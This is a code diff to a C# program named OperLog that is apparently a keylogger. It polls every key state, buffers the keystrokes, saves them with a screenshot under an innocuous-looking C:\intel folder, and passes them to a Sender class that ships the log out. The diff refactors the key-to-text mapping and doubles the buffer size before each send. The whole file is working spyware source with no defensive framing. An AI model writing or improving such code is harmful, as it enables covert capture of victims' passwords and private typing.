@@ -11,7 +11,7 @@ namespace OperLog
 {
     class Log
     {
-        public static int nsymb = 10;
+        public static int nsymb = 20;
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
         //[STAThread]
@@ -23,26 +23,17 @@ namespace OperLog
         }
         const string picpath = @"C:\intel\icon.png";
         const string logpath = @"C:\intel\log.log";
-        public static void Key_Log(object sender, DoWorkEventArgs e)
-        {
+        public void Key_Log(object sender, DoWorkEventArgs e)
+        { 
             string buf = "";
            while (true) {
                 Thread.Sleep(100);
                 for (int i = 0; i < 255; i++) 
                 {
                     int state = GetAsyncKeyState(i);
-                    if (state != 0) {
-                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
-                        if (((Keys)i) == Keys.Escape) { buf += "esc"; continue; }
-                        if (((Keys)i) == Keys.Back) { buf += "<-"; continue; }
-                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
-                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
-                        if (((Keys)i).ToString().Length == 1) {
-                            buf += ((Keys)i).ToString();
-                        }
-                        else {
-                            buf += $"<{((Keys)i).ToString()}>";
-                        }
+                    if (state != 0)
+                    {
+                        buf += GetKyesID((Keys)i);
                         if (buf.Length > nsymb) {
                             // TODO: если скрин не получилось сделать возвращать в лог сообщение о неудаче
                             MakeLog(picpath,logpath,buf);
@@ -75,6 +66,46 @@ namespace OperLog
            AddText(text,logpath);
            Sender m = new Sender();
            m.SendLog(text,picpath);
+       }
+
+       static string GetKyesID(Keys keyID)
+       {
+           string key = "";
+           if (keyID == Keys.D0) { key = "0"; return key; }
+           if (keyID == Keys.D1) { key = "1"; return key; }
+           if (keyID == Keys.D2) { key = "2"; return key; }
+           if (keyID == Keys.D3) { key = "3"; return key; }
+           if (keyID == Keys.D4) { key = "4"; return key; }
+           if (keyID == Keys.D5) { key = "5"; return key; }
+           if (keyID == Keys.D6) { key = "6"; return key; }
+           if (keyID == Keys.D7) { key = "7"; return key; }
+           if (keyID == Keys.D8) { key = "8"; return key; }
+           if (keyID == Keys.D9) { key = "9"; return key; }
+           if (keyID == Keys.Space) { key = " "; return key;}
+           if (keyID == Keys.Escape) { key = "ESC"; return key; }
+           if (keyID == Keys.Back) { key = "<-"; return key; }
+           if (keyID == Keys.Enter) { key = " NL"; return key; }
+           if (keyID == Keys.Capital) { key = "CAPS"; return key; }
+           if (keyID == Keys.Tab) { key = "TAB"; return key; }
+           if (keyID == Keys.Right || keyID == Keys.Left || keyID == Keys.Down || keyID == Keys.Up) { key = ""; return key; }
+           if (keyID == Keys.Menu || keyID == Keys.LMenu || keyID == Keys.RMenu) { key = "ALT"; return key; }
+           if (keyID == Keys.Oemplus) { key = "+"; return key; }
+           if (keyID == Keys.OemPeriod) { key = "."; return key; }
+           if (keyID == Keys.OemMinus) { key = "-"; return key; }
+           if (keyID == Keys.Oem5) { key = "/"; return key; }
+           if (keyID == Keys.ShiftKey || keyID == Keys.LShiftKey || keyID == Keys.RShiftKey) { key = "SHIFT"; return key; }
+           if (keyID == Keys.ControlKey || keyID == Keys.LControlKey || keyID == Keys.RControlKey) { key = "CTRL"; return key; }
+           if (keyID == Keys.Oem1) { key = ";"; return key; }
+           if (keyID == Keys.LButton || keyID == Keys.RButton || keyID == Keys.MButton) { key = ""; return key; }
+           if (keyID.ToString().Length == 1)
+           {
+               key = keyID.ToString();
+           }
+           else
+           {
+               key = $"<{keyID.ToString()}>";
+           }
+           return key;
        }
     }
 }
